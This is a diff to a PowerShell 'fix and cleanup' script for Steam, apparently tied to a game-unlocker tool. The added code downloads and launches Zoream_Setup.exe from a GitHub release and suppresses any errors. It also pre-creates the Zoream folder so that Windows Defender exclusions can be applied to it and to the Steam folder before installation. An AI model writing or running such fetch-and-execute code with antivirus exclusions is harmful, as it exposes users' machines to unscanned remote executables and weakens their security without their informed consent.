@@ -1,4 +1,4 @@
-try {
+Try {
     $MethodDefinition = @'
     [DllImport("kernel32.dll")]
     public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
@@ -76,16 +76,66 @@ Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"
 try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
 if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 
-
 $zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
+$zoreamExe = Join-Path $zoreamPath "Zoream.exe"
+
+# -------------------------------------------------------------------------
+# ZOREAM CHECK & DOWNLOAD MODULE
+# -------------------------------------------------------------------------
+if (-not (Test-Path $zoreamExe)) {
+    Write-Log "Zoream component missing. Initiating download..." "WARN"
+    
+    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
+    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"
+
+    try {
+        # .NET WebRequest kullanarak Timeout kontrolü ve Progress Bar
+        $request = [System.Net.WebRequest]::Create($downloadUrl)
+        $request.Timeout = 5000 # 5 Saniye Timeout
+        $response = $request.GetResponse()
+        
+        $totalLength = $response.ContentLength
+        $responseStream = $response.GetResponseStream()
+        $targetStream = [System.IO.File]::Create($tempSetup)
+        $buffer = New-Object byte[] 10KB
+        $readCount = 0
+
+        do {
+            $count = $responseStream.Read($buffer, 0, $buffer.Length)
+            $targetStream.Write($buffer, 0, $count)
+            $readCount += $count
+            if ($totalLength -gt 0) {
+                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
+                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
+            }
+        } while ($count -gt 0)
+
+        $targetStream.Close()
+        $responseStream.Close()
+        $response.Close()
+        
+        Write-Progress -Activity "Downloading Zoream Installer" -Completed
+        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"
+        
+        # Ayrı bir işlem olarak aç (PowerShell'i bekletmesin)
+        Start-Process -FilePath $tempSetup -WindowStyle Normal
+    }
+    catch {
+        # Hata olursa veya 5 saniye timeout yerse hiçbir şey yapma, devam et.
+        # İleride hata yazdırmıyoruz.
+    }
+}
+# -------------------------------------------------------------------------
 
 Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"
 
 if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
     try {
+        # Klasör fiziksel olarak oluşmamış olsa bile exclusion eklemek mantıklıdır (kurulum öncesi)
+        # Ancak orijinal kodda Test-Path kontrolü vardı, burada hata almamak için
+        # Eğer kurulum yeni indiyse klasör henüz oluşmamış olabilir.
         if (-not (Test-Path $zoreamPath)) {
-            Write-Log "Zoream folder not found: $zoreamPath" "ERROR"
-            return
+            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
         }
 
         $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath
@@ -105,8 +155,6 @@ if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
 else {
     Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
 }
-
-
 
 Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"
 
@@ -129,8 +177,6 @@ if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
 else {
     Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
 }
-
-
 
 Write-Log "Clearing Beta & Killing Processes..." "STEP"
 Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
@@ -161,7 +207,6 @@ if (Test-Path $userdataPath) {
         }
     }
 }
-
 
 Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
 $stpluginPath = Join-Path $steamPath "config\stplug-in"
@@ -220,7 +265,6 @@ else {
     }
 }
 
-
 Write-Log "Checking for steam.cfg..." "STEP"
 $cfgFiles = @("steam.cfg", "Steam.cfg")
 foreach ($cfg in $cfgFiles) {
@@ -230,7 +274,6 @@ foreach ($cfg in $cfgFiles) {
         Write-Log "Deleted: $cfg" "SUCCESS"
     }
 }
-
 
 Write-Log "Fix & Cleanup complete." "SUCCESS"
 Write-Host " "
